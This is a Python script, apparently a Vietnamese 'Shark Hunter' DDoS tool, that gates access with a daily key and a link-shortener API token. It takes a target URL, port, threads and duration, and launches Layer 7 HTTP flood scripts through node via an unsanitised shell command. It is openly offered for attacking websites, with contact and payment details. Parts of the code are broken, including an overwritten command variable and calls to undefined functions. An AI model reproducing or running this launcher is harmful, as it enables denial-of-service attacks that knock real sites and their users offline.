# code by Shark Hunter
# Muốn Leak à
# Support © 
# https://www.facebook.com/id=MrSharkHunter.vn
# momo : 0827167732
import os
import sys
import colorama
import random
import getpass
import requests
from time import strftime
from colorama import Fore
from colorama import Style
import fade
import time
from time import sleep
import subprocess
from multiprocessing.connection import wait
import socket
# Xoá Tất Cả
os.system("cls" if os.name == "nt" else "clear")
# Nhập key
ngay=int(strftime('%d'))
key1=str(ngay*1246546+23472)
key = 'Shark'+key1

url = 'https://sharkht206.000webhostapp.com/key.html?key='+key
token_link1s = 'f60643a3c709bd39920a4c6044e76e68fc85a947'
link1s = requests.get(f'https://link1s.com/api?api={token_link1s}&url={url}').json()
if link1s['status']=="error": 
	print(link1s['message'])
	quit()
else:
	link_key=link1s['shortenedUrl']
print('Link Để Vượt Key Là: '+link_key)
keynhap = input('Key Đã Vượt Là: ')
if keynhap == key:
    print('Key Đúng Mời Bạn Dùng Tool')
else:
    print("Key Sai Vui Lòng Vượt Link Lại")
    quit()
# Xóa Tất Cả    
os.system("cls" if os.name == "nt" else "clear")
# Mở File Proxy
proxys = open('proxies.txt').readlines()
bots = len(proxys)
def banner():
  time.sleep(0.6)
  print("""
\x1b[38;2;0;255;255m[ \x1b[38;2;233;233;233mShark HT \x1b[38;2;0;255;255m] | \x1b[38;2;233;233;233mBanner Shark HT \x1b[38;2;0;255;255m| \x1b[38;2;233;233;233mOwner: Shark HT \x1b[38;2;0;255;255m| \x1b[38;2;233;233;233mUpdate v1.0""")
time.sleep(0.5)
print(Fore.BLUE + Style.BRIGHT + """
╔═╗╦ ╦╔═╗╦═╗╦╔═  ╦ ╦╔╦╗
╚═╗╠═╣╠═╣╠╦╝╠╩╗  ╠═╣ ║ 
╚═╝╩ ╩╩ ╩╩╚═╩ ╩  ╩ ╩ ╩ 
 \x1b[38;2;0;212;14m╔╦╗╔╦╗╔═╗╔═╗           
  \x1b[38;2;0;212;14m║║ ║║║ ║╚═╗      
 \x1b[38;2;0;212;14m═╩╝═╩╝╚═╝╚═╝☠️
\x1b[34m╔══════════════════════════════════╗
\x1b[34m║ \x1b[38;2;0;212;14m[+] \x1b[36mhttps://t.me/MrSharkHunter💻\x1b[34m ║
\x1b[34m║ \x1b[38;2;0;212;14m[+] \x1b[36mTOOL DDOS WEBSITE L7      💻\x1b[34m ║
\x1b[34m║ \x1b[38;2;0;212;14m[+] \x1b[36mTool By Shark Hunter      💻\x1b[34m ║
\x1b[34m╚══════════════════════════════════╝""" + Style.RESET_ALL)
time.sleep(0.4)
# Hiện Method Để Chạy File
print(Fore.BLUE + Style.BRIGHT + """
|——————————————————————————————————————————————————————————|
| - - - - - - - M E T H O D S--L A Y E R 7 - - - - - - - - |
| \x1b[32m[+] 1\x1b[34m•\x1b[33mHTTP-SOCKETS URL REQ_PER_IP TIME                  \x1b[34m•|
| \x1b[32m[+] 2\x1b[34m•\x1b[33mHTTP-RAW URL PORT THREAD GET                      \x1b[34m•|
| \x1b[32m[+] 3\x1b[34m•\x1b[33mHTTP-MIX URL TIME                                 \x1b[34m•|
| \x1b[32m[+] 4\x1b[34m•\x1b[33mHTTP-RAND URL TIME                                \x1b[34m•|
|——————————————————————————————————————————————————————————|
|\x1b[33mLưu Ý: Nhập Đúng METHOD Nào Không Có Để Thì Bỏ Qua (enter)\x1b[34m|
|——————————————————————————————————————————————————————————|
""" + Style.RESET_ALL)
time.sleep(0.3)
# Command Để Chạy Từng File
def execute_command(method,target, time, request, thread, req_per_ip, port):

    command = f'node {method}.js {target} {time}'
    command = f'node {method}.js {target} {req_per_ip} {time}'
    command = f'node {method}.js {target} {port} {thread} GET'


#HTTP-RAND.js url time
#node HTTP-MIX.js [Target URL] [Time]
#Node HTTP-RAW.js https://domain.com <port> <threads> <methods>
# 

    subprocess.call(command, shell=True)

# Hàm main để lấy thông tin từ người dùng và gọi hàm execute_command
time.sleep(0.2)
def main():
    method = input(Fore.RED + Style.BRIGHT + '''╔═══[Shark-HT_METHOD@Root]\n╚══> ''' + Style.RESET_ALL)
    target = input(Fore.RED + Style.BRIGHT + '''╔═══[Shark-HT_URL@Root]\n╚══> ''' + Style.RESET_ALL)
    port = input(Fore.RED + Style.BRIGHT + '''╔═══[Shark-HT_PORT@Root]\n╚══> ''' + Style.RESET_ALL)
    time = input(Fore.RED + Style.BRIGHT + '''╔═══[Shark-HT_TIME@Root]\n╚══> ''' + Style.RESET_ALL)
    request = input(Fore.RED + Style.BRIGHT + '''╔═══[Shark-HT_REQUEST@Root]\n╚══> ''' + Style.RESET_ALL)
    req_per_ip = input(Fore.RED + Style.BRIGHT + '''╔═══[Shark-HT_REQ_PER_IP@Root]\n╚══> ''' + Style.RESET_ALL)
    thread = input(Fore.RED + Style.BRIGHT + '''╔═══[Shark-HT_THREAD@Root]\n╚══> ''' + Style.RESET_ALL)
    print(Fore.RED + Style.BRIGHT + """⚡ＡＴＴＡＣＫ-ＳＥＮＴ--ＰＬＡＮ:ᐯＩＰ🚀\x1b[38;2;0;212;14m
    SHARK HUNTER 💻""" + Style.RESET_ALL)
    execute_command(method,target, time, request, thread, req_per_ip, port)

# Gọi hàm main để chạy công cụ
if __name__ == "__main__":
    main()

def login():
    clear()
    user = "1"
    passwd = "1"
    username = input(" Username: ")
    password = getpass.getpass(prompt=' Password: ')
    if username != user or password != passwd:
        print("")
        print("⚡ Haizzz, you're so cute...")
        sys.exit(1)
    elif username == user and password == passwd:
        print("⚡ Welcome to SharkC2!")
        time.sleep(0.3)
        ascii_vro()
        main()

login()
